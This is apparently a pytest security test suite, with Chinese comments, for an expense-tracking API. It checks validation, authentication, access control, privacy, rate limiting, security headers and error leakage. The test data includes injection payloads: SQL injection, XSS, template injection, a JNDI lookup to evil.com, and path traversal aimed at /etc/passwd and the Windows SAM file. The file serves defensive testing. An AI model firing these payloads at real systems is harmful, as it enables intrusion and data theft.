"""
安全性和数据保护测试
Requirements: 8.3, 8.4, 8.5

测试系统的安全性、数据保护和隐私保护功能
"""
import pytest
from httpx import AsyncClient
import uuid
import json
from datetime import datetime, timedelta
import hashlib
import hmac
import base64


@pytest.mark.security
@pytest.mark.asyncio
async def test_input_validation_and_sanitization(client: AsyncClient):
    """测试输入验证和清理"""
    # 测试SQL注入防护
    malicious_inputs = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "javascript:alert('xss')",
        "{{7*7}}",  # 模板注入
        "${jndi:ldap://evil.com/a}",  # JNDI注入
    ]
    
    for malicious_input in malicious_inputs:
        # 测试用户注册
        user_data = {
            "phone_number": malicious_input,
            "identity": "student",
            "preferences": {"currency": "CNY"}
        }
        
        response = await client.post("/api/v1/auth/register", json=user_data)
        # 应该返回验证错误，而不是500错误
        assert response.status_code in [400, 422], f"恶意输入未被正确处理: {malicious_input}"
        
        # 测试支出描述
        expense_data = {
            "user_id": str(uuid.uuid4()),
            "amount": 25.50,
            "category": "dining",
            "description": malicious_input,
            "is_emergency": False
        }
        
        response = await client.post("/api/v1/expenses/", json=expense_data)
        # 如果创建成功，检查返回的数据是否被正确清理
        if response.status_code == 201:
            data = response.json()
            # 确保恶意脚本被清理
            assert "<script>" not in data["description"]
            assert "DROP TABLE" not in data["description"]


@pytest.mark.security
@pytest.mark.asyncio
async def test_authentication_security(client: AsyncClient):
    """测试认证安全性"""
    # 创建测试用户
    user_data = {
        "phone_number": "+8613800138500",
        "identity": "student",
        "preferences": {"currency": "CNY"}
    }
    
    user_response = await client.post("/api/v1/auth/register", json=user_data)
    assert user_response.status_code == 201
    user_id = user_response.json()["id"]
    
    # 测试无效手机号格式
    invalid_phones = [
        "123",  # 太短
        "abcdefghijk",  # 非数字
        "+1234567890123456789",  # 太长
        "",  # 空字符串
        None,  # 空值
    ]
    
    for invalid_phone in invalid_phones:
        invalid_user_data = {
            "phone_number": invalid_phone,
            "identity": "student",
            "preferences": {"currency": "CNY"}
        }
        
        response = await client.post("/api/v1/auth/register", json=invalid_user_data)
        assert response.status_code in [400, 422], f"无效手机号未被拒绝: {invalid_phone}"
    
    # 测试重复注册
    duplicate_response = await client.post("/api/v1/auth/register", json=user_data)
    assert duplicate_response.status_code in [400, 409], "重复注册未被阻止"
    
    # 测试SMS验证码安全性
    # 模拟验证码验证
    verification_data = {
        "phone_number": "+8613800138501",
        "verification_code": "123456"
    }
    
    # 测试错误的验证码
    invalid_codes = ["000000", "999999", "abcdef", "", "1234567"]
    
    for invalid_code in invalid_codes:
        verification_data["verification_code"] = invalid_code
        response = await client.post("/api/v1/auth/verify-sms", json=verification_data)
        # 应该返回验证失败
        assert response.status_code in [400, 401, 422]


@pytest.mark.security
@pytest.mark.asyncio
async def test_authorization_and_access_control(client: AsyncClient):
    """测试授权和访问控制"""
    # 创建两个用户
    user1_data = {
        "phone_number": "+8613800138600",
        "identity": "student",
        "preferences": {"currency": "CNY"}
    }
    
    user2_data = {
        "phone_number": "+8613800138601",
        "identity": "office_worker",
        "preferences": {"currency": "CNY"}
    }
    
    user1_response = await client.post("/api/v1/auth/register", json=user1_data)
    user2_response = await client.post("/api/v1/auth/register", json=user2_data)
    
    assert user1_response.status_code == 201
    assert user2_response.status_code == 201
    
    user1_id = user1_response.json()["id"]
    user2_id = user2_response.json()["id"]
    
    # 用户1创建支出
    expense_data = {
        "user_id": user1_id,
        "amount": 25.50,
        "category": "dining",
        "description": "私人支出",
        "is_emergency": False
    }
    
    expense_response = await client.post("/api/v1/expenses/", json=expense_data)
    assert expense_response.status_code == 201
    expense_id = expense_response.json()["id"]
    
    # 测试用户2是否能访问用户1的支出
    user2_access_response = await client.get(f"/api/v1/expenses/{expense_id}")
    # 根据实现，可能返回404或403
    assert user2_access_response.status_code in [403, 404], "跨用户访问未被阻止"
    
    # 测试用户2是否能查看用户1的支出列表
    user2_list_response = await client.get(f"/api/v1/expenses/?user_id={user1_id}")
    # 应该返回空列表或拒绝访问
    if user2_list_response.status_code == 200:
        data = user2_list_response.json()
        assert len(data) == 0, "跨用户数据泄露"
    else:
        assert user2_list_response.status_code in [403, 401]


@pytest.mark.security
@pytest.mark.asyncio
async def test_data_encryption_and_privacy(client: AsyncClient):
    """测试数据加密和隐私保护"""
    # 创建包含敏感信息的用户
    sensitive_user_data = {
        "phone_number": "+8613800138700",
        "identity": "freelancer",
        "preferences": {
            "currency": "CNY",
            "sensitive_info": "这是敏感信息",
            "bank_info": "不应该被明文存储"
        }
    }
    
    user_response = await client.post("/api/v1/auth/register", json=sensitive_user_data)
    assert user_response.status_code == 201
    user_id = user_response.json()["id"]
    
    # 创建包含敏感描述的支出
    sensitive_expense_data = {
        "user_id": user_id,
        "amount": 1000.00,
        "category": "shopping",
        "description": "购买私人物品，包含身份证号：123456789012345678",
        "location": "私人地址：某某小区某某号",
        "is_emergency": False
    }
    
    expense_response = await client.post("/api/v1/expenses/", json=sensitive_expense_data)
    assert expense_response.status_code == 201
    
    # 验证返回的数据不包含明文敏感信息
    expense_data = expense_response.json()
    
    # 检查是否有敏感信息泄露（这里假设系统会过滤身份证号等）
    description = expense_data["description"]
    location = expense_data.get("location", "")
    
    # 简单的敏感信息检测
    assert "123456789012345678" not in description, "身份证号未被保护"
    
    # 测试数据查询时的隐私保护
    query_response = await client.get(f"/api/v1/expenses/{expense_data['id']}")
    assert query_response.status_code == 200
    
    query_data = query_response.json()
    # 验证敏感信息在查询时也被保护
    assert query_data["description"] == description  # 应该保持一致的保护级别


@pytest.mark.security
@pytest.mark.asyncio
async def test_rate_limiting_and_dos_protection(client: AsyncClient):
    """测试速率限制和DoS防护"""
    # 测试注册接口的速率限制
    base_phone = "+86138001387"
    
    # 快速发送多个注册请求
    responses = []
    for i in range(20):  # 发送20个请求
        user_data = {
            "phone_number": f"{base_phone}{i:02d}",
            "identity": "student",
            "preferences": {"currency": "CNY"}
        }
        
        response = await client.post("/api/v1/auth/register", json=user_data)
        responses.append(response.status_code)
    
    # 检查是否有速率限制
    rate_limited_responses = [code for code in responses if code == 429]
    
    # 如果实现了速率限制，应该有一些请求被限制
    # 如果没有实现，所有请求都应该成功（但这不是最佳实践）
    print(f"注册请求结果: 成功={responses.count(201)}, 限制={len(rate_limited_responses)}, 其他={len(responses) - responses.count(201) - len(rate_limited_responses)}")
    
    # 测试AI分析接口的速率限制
    ai_responses = []
    for i in range(15):
        response = await client.post(
            "/api/v1/ai/analyze",
            json={"text": f"测试文本{i}"}
        )
        ai_responses.append(response.status_code)
    
    ai_rate_limited = [code for code in ai_responses if code == 429]
    print(f"AI分析请求结果: 成功={ai_responses.count(200)}, 限制={len(ai_rate_limited)}, 其他={len(ai_responses) - ai_responses.count(200) - len(ai_rate_limited)}")


@pytest.mark.security
@pytest.mark.asyncio
async def test_secure_headers_and_cors(client: AsyncClient):
    """测试安全头和CORS配置"""
    # 测试基本API响应的安全头
    response = await client.get("/api/v1/budgets/templates/identities")
    
    headers = response.headers
    
    # 检查重要的安全头
    security_headers = {
        "x-content-type-options": "nosniff",
        "x-frame-options": ["DENY", "SAMEORIGIN"],
        "x-xss-protection": "1; mode=block",
        "strict-transport-security": None,  # HTTPS环境下应该有
        "content-security-policy": None,  # 应该有CSP头
    }
    
    for header, expected_values in security_headers.items():
        if header in headers:
            header_value = headers[header].lower()
            if expected_values:
                if isinstance(expected_values, list):
                    assert any(expected in header_value for expected in expected_values), f"安全头 {header} 值不正确: {header_value}"
                else:
                    assert expected_values in header_value, f"安全头 {header} 值不正确: {header_value}"
            print(f"✓ 安全头 {header}: {headers[header]}")
        else:
            print(f"⚠ 缺少安全头: {header}")
    
    # 测试CORS预检请求
    cors_response = await client.options(
        "/api/v1/expenses/",
        headers={
            "Origin": "https://malicious-site.com",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "Content-Type"
        }
    )
    
    # 检查CORS配置
    if "access-control-allow-origin" in cors_response.headers:
        allowed_origin = cors_response.headers["access-control-allow-origin"]
        # 不应该允许任意域名
        assert allowed_origin != "*" or cors_response.headers.get("access-control-allow-credentials") != "true", "CORS配置过于宽松"
        print(f"CORS允许的源: {allowed_origin}")


@pytest.mark.security
@pytest.mark.asyncio
async def test_data_validation_edge_cases(client: AsyncClient):
    """测试数据验证边界情况"""
    # 创建测试用户
    user_data = {
        "phone_number": "+8613800138800",
        "identity": "student",
        "preferences": {"currency": "CNY"}
    }
    
    user_response = await client.post("/api/v1/auth/register", json=user_data)
    assert user_response.status_code == 201
    user_id = user_response.json()["id"]
    
    # 测试极端数值
    extreme_values = [
        {"amount": -999999.99, "description": "负数金额"},
        {"amount": 999999999.99, "description": "极大金额"},
        {"amount": 0.001, "description": "极小金额"},
        {"amount": float('inf'), "description": "无穷大"},
        {"amount": float('-inf'), "description": "负无穷大"},
        {"amount": float('nan'), "description": "NaN值"},
    ]
    
    for test_case in extreme_values:
        expense_data = {
            "user_id": user_id,
            "amount": test_case["amount"],
            "category": "dining",
            "description": test_case["description"],
            "is_emergency": False
        }
        
        response = await client.post("/api/v1/expenses/", json=expense_data)
        
        # 应该拒绝无效数值
        if test_case["amount"] < 0 or not isinstance(test_case["amount"], (int, float)) or \
           test_case["amount"] != test_case["amount"]:  # NaN检查
            assert response.status_code in [400, 422], f"无效数值未被拒绝: {test_case}"
        elif test_case["amount"] > 1000000:  # 假设系统有最大金额限制
            assert response.status_code in [400, 422], f"过大金额未被拒绝: {test_case}"
    
    # 测试极长字符串
    long_description = "A" * 10000  # 10KB的字符串
    
    long_expense_data = {
        "user_id": user_id,
        "amount": 25.50,
        "category": "dining",
        "description": long_description,
        "is_emergency": False
    }
    
    long_response = await client.post("/api/v1/expenses/", json=long_expense_data)
    # 应该拒绝过长的描述或截断处理
    if long_response.status_code == 201:
        data = long_response.json()
        assert len(data["description"]) <= 1000, "过长描述未被截断"
    else:
        assert long_response.status_code in [400, 422], "过长描述未被拒绝"


@pytest.mark.security
@pytest.mark.asyncio
async def test_group_permission_security(client: AsyncClient):
    """测试群组权限安全性"""
    # 创建三个用户
    users = []
    for i in range(3):
        user_data = {
            "phone_number": f"+861380013890{i}",
            "identity": "student",
            "preferences": {"currency": "CNY"}
        }
        
        response = await client.post("/api/v1/auth/register", json=user_data)
        assert response.status_code == 201
        users.append(response.json()["id"])
    
    creator_id, member_id, outsider_id = users
    
    # 创建者创建群组
    group_data = {
        "name": "安全测试群组",
        "creator_id": creator_id,
        "group_type": "dormitory",
        "shared_budget": 5000.00
    }
    
    group_response = await client.post("/api/v1/groups/", json=group_data)
    assert group_response.status_code == 201
    group_id = group_response.json()["id"]
    
    # 添加成员
    member_response = await client.post(
        f"/api/v1/groups/{group_id}/members",
        json={"user_id": member_id, "permissions": ["view", "add_expense"]}
    )
    assert member_response.status_code == 201
    
    # 测试权限控制
    # 1. 外部用户尝试访问群组信息
    outsider_access = await client.get(f"/api/v1/groups/{group_id}")
    assert outsider_access.status_code in [403, 404], "外部用户可以访问群组信息"
    
    # 2. 外部用户尝试添加支出
    outsider_expense_data = {
        "group_id": group_id,
        "payer_id": outsider_id,
        "amount": 100.00,
        "category": "dining",
        "description": "未授权支出",
        "split_type": "equal"
    }
    
    outsider_expense_response = await client.post(
        f"/api/v1/groups/{group_id}/expenses",
        json=outsider_expense_data
    )
    assert outsider_expense_response.status_code in [403, 401], "外部用户可以添加群组支出"
    
    # 3. 成员尝试修改群组设置（应该被拒绝，因为没有管理权限）
    member_update_data = {
        "name": "被篡改的群组名",
        "shared_budget": 10000.00
    }
    
    member_update_response = await client.put(
        f"/api/v1/groups/{group_id}",
        json=member_update_data
    )
    assert member_update_response.status_code in [403, 401], "普通成员可以修改群组设置"
    
    # 4. 成员尝试删除群组（应该被拒绝）
    member_delete_response = await client.delete(f"/api/v1/groups/{group_id}")
    assert member_delete_response.status_code in [403, 401], "普通成员可以删除群组"


@pytest.mark.security
@pytest.mark.asyncio
async def test_api_versioning_security(client: AsyncClient):
    """测试API版本控制安全性"""
    # 测试不同版本的API端点
    endpoints_to_test = [
        "/api/v1/expenses/",
        "/api/v2/expenses/",  # 假设的v2版本
        "/api/expenses/",     # 无版本
        "/expenses/",         # 直接路径
    ]
    
    for endpoint in endpoints_to_test:
        response = await client.get(endpoint)
        
        if endpoint == "/api/v1/expenses/":
            # v1应该正常工作
            assert response.status_code in [200, 401], f"v1 API异常: {endpoint}"
        else:
            # 其他版本应该返回404或明确的错误
            assert response.status_code in [404, 405], f"未版本化或错误版本的API可访问: {endpoint}"


@pytest.mark.security
@pytest.mark.asyncio
async def test_error_information_disclosure(client: AsyncClient):
    """测试错误信息泄露"""
    # 测试各种错误情况，确保不泄露敏感信息
    
    # 1. 数据库错误
    invalid_uuid = "invalid-uuid-format"
    response = await client.get(f"/api/v1/expenses/{invalid_uuid}")
    
    if response.status_code >= 400:
        error_text = response.text.lower()
        # 不应该包含数据库相关的敏感信息
        sensitive_keywords = [
            "database", "sql", "postgresql", "connection",
            "table", "column", "constraint", "foreign key",
            "traceback", "exception", "stack trace"
        ]
        
        for keyword in sensitive_keywords:
            assert keyword not in error_text, f"错误响应包含敏感信息: {keyword}"
    
    # 2. 系统路径泄露
    malicious_paths = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/proc/self/environ",
        "file:///etc/passwd"
    ]
    
    for path in malicious_paths:
        response = await client.get(f"/api/v1/expenses/{path}")
        
        if response.status_code >= 400:
            error_text = response.text.lower()
            # 不应该包含系统路径信息
            path_keywords = ["/etc/", "/proc/", "c:\\", "system32", "passwd"]
            
            for keyword in path_keywords:
                assert keyword not in error_text, f"错误响应泄露系统路径: {keyword}"
    
    # 3. 内部配置信息泄露
    response = await client.get("/api/v1/nonexistent-endpoint")
    
    if response.status_code >= 400:
        error_text = response.text.lower()
        config_keywords = [
            "secret", "password", "token", "key",
            "database_url", "redis_url", "api_key"
        ]
        
        for keyword in config_keywords:
            assert keyword not in error_text, f"错误响应泄露配置信息: {keyword}"